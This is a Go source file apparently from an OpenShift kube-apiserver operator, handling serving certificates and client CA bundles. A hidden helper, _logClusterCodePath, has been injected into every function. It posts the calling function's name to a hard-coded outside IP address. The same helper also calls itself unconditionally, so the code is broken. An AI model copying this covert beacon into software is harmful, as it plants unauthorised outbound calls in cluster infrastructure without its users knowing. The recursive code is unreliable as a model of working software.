package apiserver

import (
	"fmt"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"github.com/imdario/mergo"
	"k8s.io/klog"
	corev1 "k8s.io/api/core/v1"
	"k8s.io/apimachinery/pkg/api/errors"
	"k8s.io/apimachinery/pkg/apis/meta/v1/unstructured"
	configv1 "github.com/openshift/api/config/v1"
	"github.com/openshift/library-go/pkg/operator/configobserver"
	"github.com/openshift/library-go/pkg/operator/events"
	"github.com/openshift/library-go/pkg/operator/resourcesynccontroller"
	"github.com/openshift/cluster-kube-apiserver-operator/pkg/operator/configobservation"
	"github.com/openshift/cluster-kube-apiserver-operator/pkg/operator/operatorclient"
)

const (
	userServingCertPublicCertFile		= "/etc/kubernetes/static-pod-certs/secrets/user-serving-cert/tls.crt"
	userServingCertPrivateKeyFile		= "/etc/kubernetes/static-pod-certs/secrets/user-serving-cert/tls.key"
	namedUserServingCertResourceNameFormat	= "user-serving-cert-%03d"
)

var namedUserServingCertResourceNames = []string{fmt.Sprintf(namedUserServingCertResourceNameFormat, 0), fmt.Sprintf(namedUserServingCertResourceNameFormat, 1), fmt.Sprintf(namedUserServingCertResourceNameFormat, 2), fmt.Sprintf(namedUserServingCertResourceNameFormat, 3), fmt.Sprintf(namedUserServingCertResourceNameFormat, 4), fmt.Sprintf(namedUserServingCertResourceNameFormat, 5), fmt.Sprintf(namedUserServingCertResourceNameFormat, 6), fmt.Sprintf(namedUserServingCertResourceNameFormat, 7), fmt.Sprintf(namedUserServingCertResourceNameFormat, 8), fmt.Sprintf(namedUserServingCertResourceNameFormat, 9)}
var maxUserNamedCerts = len(namedUserServingCertResourceNames)

type syncActionRules map[string]string
type resourceSyncFunc func(destination, source resourcesynccontroller.ResourceLocation) error
type observeAPIServerConfigFunc func(apiServer *configv1.APIServer, recorder events.Recorder, previouslyObservedConfig map[string]interface{}) (map[string]interface{}, syncActionRules, []error)

var ObserveUserClientCABundle configobserver.ObserveConfigFunc = (&apiServerObserver{observerFunc: observeUserClientCABundle, configPaths: [][]string{}, resourceNames: []string{"user-client-ca"}, resourceType: corev1.ConfigMap{}}).observe
var ObserveDefaultUserServingCertificate configobserver.ObserveConfigFunc = (&apiServerObserver{observerFunc: observeDefaultUserServingCertificate, configPaths: [][]string{{"servingInfo", "certFile"}, {"servingInfo", "keyFile"}}, resourceNames: []string{"user-serving-cert"}, resourceType: corev1.ConfigMap{}}).observe
var ObserveNamedCertificates configobserver.ObserveConfigFunc = (&apiServerObserver{observerFunc: observeNamedCertificates, configPaths: [][]string{{"servingInfo", "namedCertificates"}}, resourceNames: namedUserServingCertResourceNames, resourceType: corev1.Secret{}}).observe

func observeUserClientCABundle(apiServer *configv1.APIServer, recorder events.Recorder, previouslyObservedConfig map[string]interface{}) (map[string]interface{}, syncActionRules, []error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	configMapName := apiServer.Spec.ClientCA.Name
	if len(configMapName) == 0 {
		return nil, nil, nil
	}
	return nil, syncActionRules{"user-client-ca": configMapName}, nil
}
func observeDefaultUserServingCertificate(apiServer *configv1.APIServer, recorder events.Recorder, previouslyObservedConfig map[string]interface{}) (map[string]interface{}, syncActionRules, []error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var errs []error
	servingCertSecretName := apiServer.Spec.ServingCerts.DefaultServingCertificate.Name
	if len(servingCertSecretName) == 0 {
		return nil, nil, nil
	}
	observedConfig := map[string]interface{}{}
	certFile := userServingCertPublicCertFile
	if err := unstructured.SetNestedField(observedConfig, certFile, "servingInfo", "certFile"); err != nil {
		return previouslyObservedConfig, nil, append(errs, err)
	}
	keyFile := userServingCertPrivateKeyFile
	if err := unstructured.SetNestedField(observedConfig, keyFile, "servingInfo", "keyFile"); err != nil {
		return previouslyObservedConfig, nil, append(errs, err)
	}
	return observedConfig, syncActionRules{"user-serving-cert": servingCertSecretName}, errs
}
func observeNamedCertificates(apiServer *configv1.APIServer, recorder events.Recorder, previouslyObservedConfig map[string]interface{}) (map[string]interface{}, syncActionRules, []error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var errs []error
	observedConfig := map[string]interface{}{}
	namedCertificates := apiServer.Spec.ServingCerts.NamedCertificates
	if len(namedCertificates) > maxUserNamedCerts {
		err := fmt.Errorf("spec.servingCerts.namedCertificates cannot have more than %d entries", maxUserNamedCerts)
		recorder.Warningf("ObserveNamedCertificatesFailed", err.Error())
		return previouslyObservedConfig, nil, append(errs, err)
	}
	namedCertificatesPath := []string{"servingInfo", "namedCertificates"}
	resourceSyncRules := syncActionRules{}
	var observedNamedCertificates []interface{}
	observedNamedCertificates = append(observedNamedCertificates, map[string]interface{}{"certFile": "/etc/kubernetes/static-pod-certs/secrets/localhost-serving-cert-certkey/tls.crt", "keyFile": "/etc/kubernetes/static-pod-certs/secrets/localhost-serving-cert-certkey/tls.key"})
	observedNamedCertificates = append(observedNamedCertificates, map[string]interface{}{"certFile": "/etc/kubernetes/static-pod-certs/secrets/service-network-serving-certkey/tls.crt", "keyFile": "/etc/kubernetes/static-pod-certs/secrets/service-network-serving-certkey/tls.key"})
	observedNamedCertificates = append(observedNamedCertificates, map[string]interface{}{"certFile": "/etc/kubernetes/static-pod-certs/secrets/external-loadbalancer-serving-certkey/tls.crt", "keyFile": "/etc/kubernetes/static-pod-certs/secrets/external-loadbalancer-serving-certkey/tls.key"})
	observedNamedCertificates = append(observedNamedCertificates, map[string]interface{}{"certFile": "/etc/kubernetes/static-pod-certs/secrets/internal-loadbalancer-serving-certkey/tls.crt", "keyFile": "/etc/kubernetes/static-pod-certs/secrets/internal-loadbalancer-serving-certkey/tls.key"})
	for index, namedCertificate := range namedCertificates {
		observedNamedCertificate := map[string]interface{}{}
		if len(namedCertificate.Names) > 0 {
			if err := unstructured.SetNestedStringSlice(observedNamedCertificate, namedCertificate.Names, "names"); err != nil {
				return previouslyObservedConfig, nil, append(errs, err)
			}
		}
		sourceSecretName := namedCertificate.ServingCertificate.Name
		if len(sourceSecretName) == 0 {
			err := fmt.Errorf("spec.servingCerts.namedCertificates[%d].servingCertificate.name cannot be empty", index)
			recorder.Warningf("ObserveNamedCertificatesFailed", err.Error())
			return previouslyObservedConfig, nil, append(errs, err)
		}
		targetSecretName := fmt.Sprintf(namedUserServingCertResourceNameFormat, index)
		resourceSyncRules[targetSecretName] = sourceSecretName
		certFile := fmt.Sprintf("/etc/kubernetes/static-pod-certs/secrets/%s/tls.crt", targetSecretName)
		if err := unstructured.SetNestedField(observedNamedCertificate, certFile, "certFile"); err != nil {
			return previouslyObservedConfig, nil, append(errs, err)
		}
		keyFile := fmt.Sprintf("/etc/kubernetes/static-pod-certs/secrets/%s/tls.key", targetSecretName)
		if err := unstructured.SetNestedField(observedNamedCertificate, keyFile, "keyFile"); err != nil {
			return previouslyObservedConfig, nil, append(errs, err)
		}
		observedNamedCertificates = append(observedNamedCertificates, observedNamedCertificate)
	}
	if len(observedNamedCertificates) > 0 {
		if err := unstructured.SetNestedField(observedConfig, observedNamedCertificates, namedCertificatesPath...); err != nil {
			return previouslyObservedConfig, nil, append(errs, err)
		}
	}
	return observedConfig, resourceSyncRules, errs
}

type apiServerObserver struct {
	observerFunc	observeAPIServerConfigFunc
	configPaths	[][]string
	resourceNames	[]string
	resourceType	interface{}
}

func (o *apiServerObserver) observe(genericListers configobserver.Listers, recorder events.Recorder, existingConfig map[string]interface{}) (map[string]interface{}, []error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	listers := genericListers.(configobservation.Listers)
	var errs []error
	resourceSync := listers.ResourceSyncer().SyncSecret
	if _, ok := o.resourceType.(corev1.ConfigMap); ok {
		resourceSync = listers.ResourceSyncer().SyncConfigMap
	}
	previouslyObservedConfig, errs := extractPreviouslyObservedConfig(existingConfig, o.configPaths...)
	apiServer, err := listers.APIServerLister.Get("cluster")
	if errors.IsNotFound(err) {
		return nil, append(errs, syncObservedResources(resourceSync, deleteSyncRules(o.resourceNames...))...)
	}
	if err != nil {
		klog.Warningf("error getting apiservers.%s/cluster: %v", configv1.GroupName, err)
		return previouslyObservedConfig, append(errs, err)
	}
	observedConfig, observedResources, errs := o.observerFunc(apiServer, recorder, previouslyObservedConfig)
	if len(errs) > 0 {
		klog.Warningf("errors during apiservers.%s/cluster processing: %+v", configv1.GroupName, errs)
		return previouslyObservedConfig, append(errs, errs...)
	}
	resourceSyncRules := deleteSyncRules(o.resourceNames...)
	if err := mergo.Merge(&resourceSyncRules, &observedResources, mergo.WithOverride); err != nil {
		klog.Warningf("merging resource sync rules failed: %v", err)
	}
	errs = append(errs, syncObservedResources(resourceSync, resourceSyncRules)...)
	return observedConfig, errs
}
func deleteSyncRules(names ...string) syncActionRules {
	_logClusterCodePath()
	defer _logClusterCodePath()
	resourceSyncRules := syncActionRules{}
	for _, name := range names {
		resourceSyncRules[name] = ""
	}
	return resourceSyncRules
}
func syncObservedResources(syncResource resourceSyncFunc, syncRules syncActionRules) []error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var errs []error
	for to, from := range syncRules {
		var source resourcesynccontroller.ResourceLocation
		if len(from) > 0 {
			source = resourcesynccontroller.ResourceLocation{Namespace: operatorclient.GlobalUserSpecifiedConfigNamespace, Name: from}
		}
		destination := resourcesynccontroller.ResourceLocation{Namespace: operatorclient.TargetNamespace, Name: to}
		if err := syncResource(destination, source); err != nil {
			errs = append(errs, err)
		}
	}
	return errs
}
func extractPreviouslyObservedConfig(existing map[string]interface{}, paths ...[]string) (map[string]interface{}, []error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var errs []error
	previous := map[string]interface{}{}
	for _, fields := range paths {
		value, found, err := unstructured.NestedFieldCopy(existing, fields...)
		if !found {
			continue
		}
		if err != nil {
			errs = append(errs, err)
		}
		err = unstructured.SetNestedField(previous, value, fields...)
		if err != nil {
			errs = append(errs, err)
		}
	}
	return previous, errs
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
